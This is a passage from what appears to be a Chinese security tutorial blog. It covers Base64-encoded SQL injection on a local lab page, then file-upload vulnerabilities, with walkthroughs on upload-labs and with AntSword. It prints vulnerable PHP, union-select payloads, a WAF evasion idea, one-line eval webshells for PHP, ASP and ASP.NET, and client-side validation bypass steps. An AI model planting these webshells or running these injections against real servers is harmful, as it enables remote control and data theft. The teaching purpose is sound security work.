href="http://127.0.0.1/sqli/base64.php?id=MSc=%EF%BC%89%EF%BC%8C%E9%A1%B5%E9%9D%A2%E8%BF%94%E5%9B%9E%E9%94%99%E8%AF%AF%E3%80%821">http://127.0.0.1/sqli/base64.php?id=MSc%3d），页面返回错误。1</a> and 1&#x3D;1和1 and 1&#x3D;2的Base64编码分别为MSBhbmQgMT0x和MSBhbmQgMT0y，再次访问id&#x3D;MSBhbmQgMT0x和id&#x3D;MSBhbmQgMT0y，返回结果如图60和图61所示。</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804213826084.png" alt="image-20230804213826084"></p><p>​                                                    图60 访问id&#x3D;MSBhbmQgMT0x的结果 </p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804213847939.png" alt="image-20230804213847939"></p><p>​                                                      图61 访问id&#x3D;MSBhbmQgMT0y的结果</p><p>从返回结果可以看到，访问od&#x3D;1 and 1&#x3D;1时，页面返回与id&#x3D;1相同的结果，而访问od&#x3D;1 and 1&#x3D;2时，页面返回与id&#x3D;1不同的结果，所以该网页存在SQL注入漏洞。<br>接着，使用order by查询字段，使用union方法完成此次注入。</p><h4 id="Base64注入代码分析"><a href="#Base64注入代码分析" class="headerlink" title="Base64注入代码分析"></a>Base64注入代码分析</h4><p>在Base64注入页面中，程序获取GET参数ID，利用base_decode()对参数ID进行Base64解码，然后直接将解码后的$id拼接到select语句中进行查询。通过while循环将查询结果输出到页面，代码如下所示。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">base64_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$con</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ID:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&lt;br &gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;user:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;br &gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;pass:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;br &gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;now use &quot;</span>.<span class="variable">$sql</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于代码没有过滤解码后的$id，且将$id直接拼接到SQl语句中，所以存在SQL注入漏洞。当访问id&#x3D;1 union select 1,2,3–+（访问时，先进行Base64编码）时，执行的SQL语句为：<br><code>select * from users where id=1 union select 1,2,3--+</code><br>此时SQL语句可以分为select * from users where <code>id</code>&#x3D;1和union select 1,2,3两条，利用第二条语句（Union查询）就可以获取数据库中的数据。<br>这种攻击方式还有其他利用场景，例如，如果有WAF，则WAF会对传输中的参数ID进行检查，但由于传输中的ID经过Base64编码，所以此时WAF很有可能检测不到危险代码，进而绕过了WAF检测。</p><h2 id="六、sql注入getshell的几种方式"><a href="#六、sql注入getshell的几种方式" class="headerlink" title="六、sql注入getshell的几种方式"></a>六、sql注入getshell的几种方式</h2><p>传送门 -》<a href="https://blog.csdn.net/qq_44159028/article/details/116274542">sql注入getshell的几种方式</a></p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2023/07/21/wen-jian-shang-chuan/"/>
      <url>/2023/07/21/wen-jian-shang-chuan/</url>
      
        <content type="html"><![CDATA[<p><a name="CnPQp"></a></p><h2 id="一、WebShell-与-WebShell-管理工具"><a href="#一、WebShell-与-WebShell-管理工具" class="headerlink" title="一、WebShell 与 WebShell 管理工具"></a>一、WebShell 与 WebShell 管理工具</h2><p><a name="S25gD"></a></p><h3 id="1-1-什么叫做WebShell-？"><a href="#1-1-什么叫做WebShell-？" class="headerlink" title="1.1 什么叫做WebShell ？"></a>1.1 什么叫做WebShell ？</h3><ul><li>WebShell , 简称网页后门。简单来说它是运行在Web应用之上的远程控制程序。</li><li>webShell其实就是一张网页，由PHP、JSP、ASP、ASP.NET等这类web应用程序语言开发，但webShell并不具备常见网页的功能，例如登录、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能。</li><li><strong>常见的WebShell有哪些？</strong></li><li>大马、小马、各种马…等</li><li>拥有较完整功能的webshell，我们一般称为大马。</li><li>功能简易的webshell称为小马。</li><li>除此之外还存在一句话木马、菜刀马、脱库马等等的名词，是对于webShell功能或者特性的简称。<br><a name="sBLRC"></a></li></ul><h3 id="1-2-WebShell-有什么作用呢-？"><a href="#1-2-WebShell-有什么作用呢-？" class="headerlink" title="1.2 WebShell 有什么作用呢 ？"></a>1.2 WebShell 有什么作用呢 ？</h3><p><a name="LRIBB"></a></p><h4 id="1-2-1-让我们拿举个例子-一句话木马-来讲："><a href="#1-2-1-让我们拿举个例子-一句话木马-来讲：" class="headerlink" title="1.2.1 让我们拿举个例子(一句话木马)来讲："></a>1.2.1 让我们拿举个例子(一句话木马)来讲：</h4><ul><li>在举例之前的呢，我们要做一些前期准备。</li></ul><p><strong>前期准备</strong>：</p><ol><li>安装一下集成环境：这里推荐使用 PHPstudy </li><li>安装好环境之后我们来编写一个一句话木马（如何编写我们之后详细讲解）</li><li>写好之后呢，我们进行本地利用。</li></ol><hr><ul><li>首先我来完整的给大家演示一遍</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182618029.png" alt="image-20230724182618029"></p><ul><li><p>掏出我们之前准备好的一句话木马，放在phpStudy\PHPTutorial\WWW目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[x]); ?&gt; </span><br></pre></td></tr></table></figure></li><li><p><strong>本地访问：</strong> 127.0.0.1&#x2F;shell.php（我们刚才创建的木马文件名称）</p></li><li><p>打开HackBar（浏览器插件）：尝试利用这个一句话木马来返回PHPinfo的信息</p></li><li><p>构建返回PHPinfo的语句：X&#x3D;phpinfo();这也是一个任意代码执行，我们通过变量X传递的任何指令都会被当做PHP代码来执行。也可以通过这条指令来调用调用系统函数：X&#x3D;system(whomai); 、x&#x3D;system(whomai);</p></li></ul><hr><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182646939.png" alt="image-20230724182646939"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182702206.png" alt="image-20230724182702206"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182715247.png" alt="image-20230724182715247"><br><a name="OlUL9"></a></p><h4 id="1-2-2-大马有什么作用呢"><a href="#1-2-2-大马有什么作用呢" class="headerlink" title="1.2.2 大马有什么作用呢?"></a>1.2.2 大马有什么作用呢?</h4><ul><li>当我们通过某些操作上传了大马之后，我们可以通过大马来获取目标主机的控制权限、对内网进行扫描、获取内部系统的信息、盗取数据库等等一系列操作。</li><li>我们可以在GitHub上来搜索一些webshell（网上的信息可能存在后门要注意分辨，这里我就不放了）<br><a name="aH9D3"></a></li></ul><h3 id="1-3-WebShell-之-PHP-一句话木马解读"><a href="#1-3-WebShell-之-PHP-一句话木马解读" class="headerlink" title="1.3 WebShell 之 PHP 一句话木马解读"></a>1.3 WebShell 之 PHP 一句话木马解读</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[x]); ?&gt; </span><br></pre></td></tr></table></figure><ul><li><p>$_POST[x]: 获取 POST请求参数中X的值。例如POST请求中传递 x&#x3D;phpinfo();，那么 $_POST[x]就等同于phpinfo();</p></li><li><p>eval（）将字符串当做PHP代码去执行。例如 eval(‘phpinfo();’)，其中 phpinfo();会被当做PHP代码去执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[x]); ?&gt;   实际上的传递过程是这样的  </span><br><span class="line">                ↓ </span><br><span class="line">&lt;?php @eval(&#x27;phpinfo();&#x27;); ?&gt; 实际的语句是这样的  </span><br></pre></td></tr></table></figure></li><li><p>我们通过该webshell，传递任意PHP代码，让其去执行，从而达到任意代码执行。</p></li><li><p>错误控制运算符，当将 @放置在一个PHP表达式之前，该表达式可能产生的任何错误信息都被 忽略掉。<br><a name="zn2XX"></a></p></li></ul><h3 id="1-4-WebShell-之常用的一句话木马"><a href="#1-4-WebShell-之常用的一句话木马" class="headerlink" title="1.4 WebShell 之常用的一句话木马"></a>1.4 WebShell 之常用的一句话木马</h3><ul><li><p>ASP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;x&quot;)%&gt; </span><br></pre></td></tr></table></figure></li><li><p>ASP.NET：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval (Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt; </span><br></pre></td></tr></table></figure></li><li><p>这些一句话木马的本质是一样的，不同环境要用不同的一句话木马。<br><a name="j46qF"></a></p></li></ul><h3 id="1-5-WebShell-管理工具"><a href="#1-5-WebShell-管理工具" class="headerlink" title="1.5 WebShell 管理工具"></a>1.5 WebShell 管理工具</h3><p><a name="qIY2P"></a></p><h4 id="1-5-1-常用-WebShell-管理工具"><a href="#1-5-1-常用-WebShell-管理工具" class="headerlink" title="1.5.1 常用 WebShell 管理工具"></a>1.5.1 常用 WebShell 管理工具</h4><ul><li>中国菜地</li><li>中国蚁剑</li><li>冰蝎</li><li>哥斯拉</li><li>…<br><a name="rU587"></a></li></ul><h4 id="1-5-2-我们来拿中国蚁剑来举例："><a href="#1-5-2-我们来拿中国蚁剑来举例：" class="headerlink" title="1.5.2 我们来拿中国蚁剑来举例："></a>1.5.2 我们来拿中国蚁剑来举例：</h4><ul><li>打开中国蚁剑，右键打开添加数据</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182847760.png" alt="image-20230724182847760"></p><ul><li>URL地址：就是一句话木马的地址</li><li>链接密码：就是变量X</li><li>编码设置：UTF8</li><li>链接类型：PHP（你用什么一句话木马链接什么类型）</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182901618.png" alt="image-20230724182901618"></p><ul><li>测试一下：链接成功</li><li>如果链接失败的话，你是不能进行正常访问的。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182914159.png" alt="image-20230724182914159"></p><ul><li>选择添加就可以看到你链接的数据了</li><li>能够进入到你木马存放的目录了。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182925802.png" alt="image-20230724182925802"></p><ul><li>我们可以尝试着进行增删改查，来实现一些我们想要实现的操作。</li><li>比如说我们创建一个新的目录，猪猪</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182936801.png" alt="image-20230724182936801"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182952088.png" alt="image-20230724182952088"></p><ul><li>可以查看到刚才新建的</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183003748.png" alt="image-20230724183003748"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183028277.png" alt="image-20230724183028277"></p><ul><li>比如说我们再创建一个新的目录，1234</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183042124.png" alt="image-20230724183042124"> <img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183055708.png" alt="image-20230724183055708"></p><ul><li>让我们看看实际演示的过程</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183111681.png" alt="image-20230724183111681"></p><ul><li><strong>我们也可以尝试使用一下虚拟终端</strong></li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183135163.png" alt="image-20230724183135163"></p><ul><li>打开虚拟终端，输入ipconfig 可以查看一下当前的网络信息</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183152547.png" alt="image-20230724183152547"></p><ul><li><strong>还可以链接数据库</strong></li><li><strong>前提：</strong> 你需要知道数据库的账号和密码</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183204577.png" alt="image-20230724183204577"></p><ul><li>还有一个拓展功能，插件市场。</li><li>插件市场里面可以选择安装一些常见的插件。比如说存活扫描之类的等等。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183219716.png" alt="image-20230724183219716"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183232973.png" alt="image-20230724183232973"><br><a name="tiSVz"></a></p><h3 id="1-6-拓展思考"><a href="#1-6-拓展思考" class="headerlink" title="1.6 拓展思考"></a>1.6 拓展思考</h3><ul><li>我们上面讲了这么多，这个时候有些同学可能就会有疑问了。<br><a name="cZvp4"></a></li></ul><h4 id="1-6-1-思考一："><a href="#1-6-1-思考一：" class="headerlink" title="1.6.1 思考一："></a>1.6.1 思考一：</h4><ul><li>如果去掉一句话木马中的错误运算符 @会产生怎样的效果呢？</li><li>那我们现在就来尝试一下：</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183246453.png" alt="image-20230724183246453"></p><ul><li>可以看到会出现报错信息。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183258235.png" alt="image-20230724183258235"><br><a name="CuPYl"></a></p><h4 id="1-6-2-思考二："><a href="#1-6-2-思考二：" class="headerlink" title="1.6.2 思考二："></a>1.6.2 思考二：</h4><ul><li>大马跟小马有什么区别呢？</li><li>小马的代码量小，但是运行的时候需要环境。功能单一且操作复杂。</li><li>大马的功能强大，但是限制多（比如说会有很多限制函数），代码量大。也不是很好用。<br><a name="S8JcX"></a></li></ul><h2 id="二、文件上传漏洞概述"><a href="#二、文件上传漏洞概述" class="headerlink" title="二、文件上传漏洞概述"></a>二、文件上传漏洞概述</h2><p><a name="Fs27t"></a></p><h3 id="2-1-随处可见的文件上传功能"><a href="#2-1-随处可见的文件上传功能" class="headerlink" title="2.1 随处可见的文件上传功能"></a>2.1 随处可见的文件上传功能</h3><ul><li>大部分站点都具有 文件上传功能，例如头像更改，文章编辑，附件上传等等。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183312064.png" alt="image-20230724183312064"><br><a name="VKngU"></a></p><h3 id="2-2-文件上传功能背后的业务逻辑是什么？"><a href="#2-2-文件上传功能背后的业务逻辑是什么？" class="headerlink" title="2.2 文件上传功能背后的业务逻辑是什么？"></a>2.2 文件上传功能背后的业务逻辑是什么？</h3><ul><li><strong>文件上传的这个功能是如何实现的呢？</strong></li><li>文件上传功能的作用是将 本地文件上传至服务器上进行保存。</li><li>当我们找到上传的入口，上传文件之后。</li><li>可能会回显文件上传的路径，如果回显了文件上传路径，那么我们就可以根据回显的文件上传路径进行访问，那么我们就可以在浏览器中访问到服务器上的这个文件。</li><li>可以尝试用pickchu靶场进行复现。</li><li><a href="https://blog.csdn.net/weixin_44519789/article/details/114969948">PikaChu_不安全的文件上传漏洞</a></li><li>这里的复现过程，我就不一一赘述了。感兴趣的大家可以访问上面的链接。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183332909.png" alt="image-20230724183332909"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183347059.png" alt="image-20230724183347059"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183408678.png" alt="image-20230724183408678"><br><a name="tqofB"></a></p><h3 id="2-3-任意文件上传的安全风险"><a href="#2-3-任意文件上传的安全风险" class="headerlink" title="2.3 任意文件上传的安全风险"></a>2.3 任意文件上传的安全风险</h3><ul><li><strong>假设文件上传功能没有对上传的文件进行限制，可能会引发哪些安全风险?</strong></li><li>如果是对方是LAMP架构，是否能上传PHP的WebShell到服务端上，然后通过访问上传后的文件地址，从而执行WebShell中的代码。达到控制对方服务器的目的。</li><li><strong>实验演示：</strong></li><li>让我们禁用JS来跳过验证来上传一句话木马</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183420476.png" alt="image-20230724183420476"></p><ul><li>上传成功之后，尝试访问木马，访问成功之后来验证一下，尝试返回phpinfo的信息。返回信息成功之后，让我们挂上蚁剑。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183432110.png" alt="image-20230724183432110"></p><ul><li>来我们尝试来链接上蚁剑，链接上之后就能就能干我们想要的操作了。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183451313.png" alt="image-20230724183451313"> <img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183503781.png" alt="image-20230724183503781"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183515475.png" alt="image-20230724183515475"><br><a name="MTYUw"></a></p><h3 id="2-4-什么是文件上传漏洞"><a href="#2-4-什么是文件上传漏洞" class="headerlink" title="2.4 什么是文件上传漏洞"></a>2.4 什么是文件上传漏洞</h3><ul><li>文件上传漏洞是指文件上传功能没有对上传的文件做合理严谨的过滤，导致用户可以利用此功能，上传能被服务端解析执行的文件，并通过此文件获得执行服务端命令的能力。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183530376.png" alt="image-20230724183530376"><br><a name="S7EyX"></a></p><h2 id="三、文件上传漏洞绕过"><a href="#三、文件上传漏洞绕过" class="headerlink" title="三、文件上传漏洞绕过"></a>三、文件上传漏洞绕过</h2><ul><li><a href="https://blog.csdn.net/qq_32448559/article/details/81667309">环境准备：upload-labs 靶场的安装与配置教程</a><br><a name="hCVVG"></a></li></ul><h3 id="3-1-文件上传的验证机制有哪些"><a href="#3-1-文件上传的验证机制有哪些" class="headerlink" title="3.1 文件上传的验证机制有哪些"></a>3.1 文件上传的验证机制有哪些</h3><ul><li><strong>客户端JavaScript验证</strong></li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183656050.png" alt="image-20230724183656050"></p><ul><li><strong>服务端MIME类型验证</strong></li><li><strong>服务端文件扩展名验证（ 黑名单、 白名单 ）</strong></li><li><strong>服务器文件内容验证 （ 文件头(文件幻数) 、文件加载检测 ）</strong><br><a name="MuUq5"></a></li></ul><h4 id="3-1-1-客户端JavaScript验证"><a href="#3-1-1-客户端JavaScript验证" class="headerlink" title="3.1.1 客户端JavaScript验证"></a>3.1.1 客户端JavaScript验证</h4><ul><li><strong>目的：</strong> 对上传文件的文件格式进行一个验证</li><li><strong>客户端JavaScript验证验证的机制</strong></li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183707890.png" alt="image-20230724183707890"></p><hr><ul><li><p>打开upload-labs 靶场第一题 - JS检查</p></li><li><p><strong>源码分析</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>; </span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="variable">$msg</span> = <span class="literal">null</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;     </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;         </span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];         <span class="comment">//取出文件上传后临时存储的文件名         </span></span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];         <span class="comment">//生成一个新的文件存储路径，文件名保持文件上传前的文件名         </span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;         <span class="comment">//move_uploaded_file函数把上传的文件移动到新的位置，成功则返回true，失败则返回false             </span></span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;         &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;             <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;        </span><br><span class="line">             &#125;     &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;         <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;     </span><br><span class="line">         &#125; &#125; <span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>这里先是包含几个文件，然后出现了一些新的函数</p></li><li><p>file_exists函数检查文件或目录是否存在。如果指定的文件或目录存在则返回 TRUE，否则返回 FALSE。</p></li><li><p>而UPLOAD_PATH这个常量在config.php文件中，有这么一段代码define(“UPLOAD_PATH”, “..&#x2F;upload”);，进行了设置。</p></li><li><p>那这个$_FILES[‘upload_file’][‘tmp_name’]又是哪儿冒出来的呢，upload_file就是文件上传的表单的名字,如下图</p></li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183919079.png" alt="image-20230724183919079"></p><ul><li><p><strong>这里是$_FILES中的那些参数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_FILES这个变量用与上传的文件参数设置，是一个多维数组 数组的用法就是 $_FILES[&#x27;key&#x27;][&#x27;key2&#x27;]; $_FILES[&#x27;upfile&#x27;]是你表单上传的文件信息数组，upfile是文件上传字段，在上传时由服务器根据上传字段设定。 $_FILES[&#x27;upfile&#x27;]包含了以下内容: $_FILES[&#x27;upfile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。 $_FILES[&#x27;upfile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 $_FILES[&#x27;upfile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。 $_FILES[&#x27;upfile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名。 $_FILES[&#x27;upfile&#x27;][&#x27;error&#x27;] 和该文件上传相关的错误代码。 </span><br></pre></td></tr></table></figure></li><li><p>下面这段js代码定义了检查上传文件的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;        </span><br><span class="line">    <span class="keyword">var</span> file = document.<span class="title function_ invoke__">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;       <span class="comment">//获取到文件名         </span></span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;             </span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);            </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;         &#125;                </span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;          <span class="comment">//定义允许上传的文件类型                  </span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_ invoke__">substring</span>(file.<span class="title function_ invoke__">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));         <span class="comment">//提取上传文件的类型。         //通过lastIndexOf取到“.”的索引，再使用substring函数截取 .后缀名                </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_ invoke__">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;         <span class="comment">//如果 allow_ext 中没有 ext_name字符串，则返回-1             </span></span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;            </span><br><span class="line">        <span class="title function_ invoke__">alert</span>(errMsg);            </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;         &#125;          <span class="comment">//判断上传文件类型是否允许上传     &#125; &lt;/script&gt; </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><hr><ul><li><strong>推荐两个关于JS的浏览器插件</strong></li><li>关于禁用JS的两个浏览器插件，个人倾向性于第一个，我觉得可以选择禁用JS简单快捷高效，第二个的话功能比较多一些，但是也会禁用掉正常页面的JS</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184105906.png" alt="image-20230724184105906"></p><hr><p><a name="hx5lI"></a></p><h5 id="3-1-1-1-绕过客户端JavaScript验证的方法"><a href="#3-1-1-1-绕过客户端JavaScript验证的方法" class="headerlink" title="3.1.1.1 绕过客户端JavaScript验证的方法"></a>3.1.1.1 绕过客户端JavaScript验证的方法</h5><ul><li><strong>方法一：</strong> 修改JavaScript去修改其中关键的检测函数，或者直接通过插件禁用JavaScript。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184129570.png" alt="image-20230724184129570"></p><ul><li><strong>方法二：</strong> 